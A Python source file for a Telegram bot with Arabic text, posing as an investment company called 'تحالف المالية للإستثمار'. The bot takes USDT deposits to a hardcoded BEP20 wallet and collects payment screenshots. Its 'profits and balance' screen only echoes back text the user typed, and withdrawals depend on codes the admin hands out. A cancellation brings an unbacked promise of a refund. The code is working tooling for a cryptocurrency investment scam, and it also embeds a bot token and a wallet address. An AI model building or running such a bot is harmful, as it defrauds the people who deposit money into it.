import logging
import os
import random
import string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# التوكن المعتمد للبوت
TOKEN = "9056801472:AAHsVQ8Iwl_pa34_4gAYxakvY5y-r-vEjzU"
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# قاموس لتتبع حالة كل مستخدم
user_states = {}
# قاموس لحفظ بيانات كل مستخدم شخصياً
user_custom_data = {}

# قائمة الأكواد ومرجعيات العمليات الصالحة (تبدأ بـ 354)
valid_codes = {"354101", "354202", "354189"}
USED_CODES = set()

def generate_new_code() -> str:
    """توليد معرف عملية جديد وعشوائي وآمن يبدأ بـ 354"""
    chars = string.digits
    return "354" + "".join(random.choices(chars, k=6))

# تقدير عمر الحساب بناءً على الـ ID
def estimate_account_age(user_id: int) -> str:
    if user_id < 10000000:
        return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
    elif user_id < 100000000:
        return "حساب قديم (بين 2014 - 2016 تقريباً)"
    elif user_id < 500000000:
        return "حساب متوسط القدَم (بين 2016 - 2019 تقريباً)"
    elif user_id < 1000000000:
        return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
    else:
        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"

# أمر عرض الأكواد والمراجع الفعّالة للأدمن
async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    codes_list = ", ".join(valid_codes)
    await update.message.reply_text(
        f"🔑 **أرقام المراجع وأكواد العملية الفعّالة حالياً:**\n`{codes_list}`",
        parse_mode="Markdown"
    )

# أمر إضافة رقم مرجع جديد
async def admin_add_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if context.args:
        new_ref_code = context.args[0].strip()
        valid_codes.add(new_ref_code)
        await update.message.reply_text(
            f"✅ **تمت إضافة رقم مرجع العملية بنجاح!**\n\n• المرجع المضاف: `{new_ref_code}`\n• أصبح جاهزاً ليستخدمه الزبون.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "⚠️ الرجاء كتابة رقم مرجع العملية بعد الأمر بمسافة.\nمثال:\n`/addcode 354999`",
            parse_mode="Markdown"
        )

# أمر /start الترحيبي مع معلومات الحساب والأزرار الرئيسية
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_states[user_id] = "waiting_for_subscription_text"
    
    age_estimation = estimate_account_age(user_id)
    
    welcome_msg = (
        f"🌟 أهلاً بك في شركة **تحالف المالية للإستثمار** 🇸🇦\n"
        f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
        f"📊 معلومات حسابك:\n"
        f"• معرفك الشخصي (ID): `{user_id}`\n"
        f"• تقدير الحساب: {age_estimation}\n\n"
        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام، أو استخدم الأزرار أدناه:"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
            InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
        ],
        [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=reply_markup)

# معالجة الرسائل النصية والتحقق من البيانات والأكواد (رقم التحقق)
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return

    user_id = update.effective_user.id
    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
    text = msg.text.strip()
    current_state = user_states.get(user_id)

    if current_state == "completed":
        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك استخدام الأزرار أو التواصل مع الدعم الفني.")
        return

    # الحالة الأولى: استقبال بيانات التسجيل
    if current_state == "waiting_for_subscription_text":
        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك") or text.startswith("حساب") or len(text) > 10:
            user_custom_data[user_id] = text
            user_states[user_id] = "waiting_for_code"
            
            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم التحقق (رقم مرجع العملية)** الخاص بك (الذي يبدأ بـ 354) لكي تتمكن من رؤية أرباحك ورصيدك:")
        else:
            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
        return

    # الحالة الثانية: التحقق من رقم التحقق/المرجع (الذي يبدأ بـ 354 أو موجود في الأكواد الصالحة)
    if current_state == "waiting_for_code" or text.startswith("354") or text in valid_codes:
        if text in valid_codes:
            # 1. حرق الكود واستبعاده فوراً لكي لا يُستخدم مرة أخرى
            valid_codes.remove(text)
            USED_CODES.add(text)
            user_states[user_id] = "choosing"
            
            # 2. توليد رقم تحقق (كود) جديد تلقائياً وإضافته لقائمة الأكواد الصالحة
            auto_new_code = generate_new_code()
            valid_codes.add(auto_new_code)

            # 3. إرسال الكود المتجدد الجديد حصرياً إلى الأدمن على الخاص
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "🔑 **تم استهلاك رقم تحقق وإصدار رقم جديد!**\n\n"
                    f"• الرقم المستهلك (المحروق): `{text}`\n"
                    f"• بواسطة المستخدم: `{user_id}` ({username})\n\n"
                    f"🆕 **رقم التحقق الجديد المتجدد للزبون القادم:**\n`{auto_new_code}`"
                ),
                parse_mode="Markdown"
            )

            keyboard = [
                [
                    InlineKeyboardButton("تأكيد الاشتراك", callback_data="sub_confirm"),
                    InlineKeyboardButton("إلغاء الاشتراك", callback_data="sub_cancel")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")

            # 4. عرض الأرباح والرصيد للزبون بعد نجاح التحقق
            await msg.reply_text(
                text=(
                    "✅ **تم التحقق من رقم التحقق بنجاح!**\n"
                    "📈 تم استعراض تفاصيل أرباحك ورصيدك المتاح بنجاح.\n\n"
                    f"إليك بياناتك المسجلة:\n\n{user_specific_data}"
                ),
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await msg.reply_text("❌ رقم التحقق غير صحيح أو تم استخدامه مسبقاً. يرجى التأكد من الرقم الصحيح.")
        return

# معالجة استلام لقطات الشاشة (Screenshots) للإيداع
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]

    await update.message.reply_text(
        "📸 **تم استلام لقطة الشاشة (Screenshot) بنجاح!**\n\n"
        "جاري مراجعة عملية التحويل وتوثيقها في النظام. شكراً لثقتك بـ **تحالف المالية للإستثمار**.\n"
        f"للمتابعة السريعة مع الدعم الفني: {SUPPORT_HANDLE}"
    )

    caption = (
        "📥 **إيصال إيداع جديد تم رفعه من مستخدم!**\n\n"
        f"👤 اسم المستثمر: {user.first_name}\n"
        f"🆔 معرف المستخدم: `{user.id}`\n"
        f"🔗 يوزر الحساب: @{user.username if user.username else 'لا يوجد'}"
    )
    try:
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=caption, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"فشل إرسال صورة الإيداع للأدمن: {e}")

# معالجة الأزرار التفاعلية
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data  
    chat_id = query.message.chat_id
    user = query.from_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "بدون معرف"

    if data == "btn_deposit":
        deposit_text = (
            "📥 **بيانات الإيداع والتحويل الرسمي**\n\n"
            "العملة: **USDT**\n"
            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
            "العنوان:\n"
            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
            "⚠️ يرجى التأكد من اختيار شبكة (BEP20) لضمان وصول التحويل.\n"
            "📸 عند اكتمال الدفع، يرجى إرسال لقطة شاشة (Screenshot) هنا لتوثيق وتأكيد العملية."
        )
        keyboard = [
            [InlineKeyboardButton("✅ تم الدفع تحقق من العملية", callback_data="deposit_check")],
            [InlineKeyboardButton("الغاء ورجوع", callback_data="back_to_main")]
        ]
        await query.edit_message_text(deposit_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "deposit_check":
        await query.edit_message_text(
            "⏳ **جاري التحقق من عملية الإيداع...**\n\n"
            "تم إرسال طلب التحقق الخاص بك إلى الإدارة لمراجعته وتأكيده في أقرب وقت. شكراً لك!",
            parse_mode="Markdown"
        )
        admin_notice = (
            "🔔 **تنبيه: طلب تحقق من إيداع جديد!**\n\n"
            f"👤 المستثمر: {user.first_name}\n"
            f"🆔 الآي دي: `{user_id}`\n"
            f"🔗 اليوزر: {username}\n"
            "📌 الضغط على: (تم الدفع تحقق من العملية)."
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_notice, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"فشل إرسال إشعار الإيداع للأدمن: {e}")

    elif data == "btn_withdraw":
        withdraw_text = (
            "📤 **طلب سحب الأرباح:**\n\n"
            "• الرجاء إرسال **رقم التحقق (رقم مرجع الاشتراك)** الخاص بك (الذي يبدأ بـ `354`) في المحادثة هنا لتتمكن من رؤية رصيدك وأرباحك وسحبها.\n\n"
            f"لأي استفسار إضافي، تواصل مع الدعم الفني: {SUPPORT_HANDLE}"
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
        await query.edit_message_text(withdraw_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "back_to_main":
        user_states[user_id] = "waiting_for_subscription_text"
        main_text = (
            f"🌟 أهلاً بك من جديد في القائمة الرئيسية لشركة **تحالف المالية للإستثمار** 🇸🇦\n\n"
            "اختر أحد الخيارات أدناه أو أرسل بياناتك ورقم التحقق الخاص بك:"
        )
        keyboard = [
            [
                InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
                InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
            ],
            [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")]
        ]
        await query.edit_message_text(main_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "sub_cancel":
        user_states[user_id] = "completed"
        await context.bot.send_message(
            chat_id=chat_id,
            text="سيتم استرجاع المبلغ على نفس الحساب خلال 48 ساعة"
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ تنبيه: قام شخص بإلغاء الاشتراك!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}\n• الاختيار: إلغاء الاشتراك ❌",
            parse_mode="Markdown"
        )

    elif data == "sub_confirm":
        user_states[user_id] = "completed"
        await context.bot.send_message(
            chat_id=chat_id,
            text="شكراً لاختياركم شركة تحالف المالية للإستثمار! تم قبول وتأكيد اشتراكك بنجاح. لأي استفسارات، فريق الدعم الفني في خدمتكم"
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ تنبيه: قام شخص بتأكيد اشتراكه بنجاح!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}\n• الاختيار: تأكيد الاشتراك ✔️",
            parse_mode="Markdown"
        )

def main():
    if not TOKEN:
        raise ValueError("❌ خطأ: لم يتم تعيين التوكن في الكود!")
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("codes", admin_get_codes))
    app.add_handler(CommandHandler("addcode", admin_add_code))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل الميزات وتوليد الأكواد للأدمن...")
    app.run_polling()

if __name__ == "__main__":
    main()
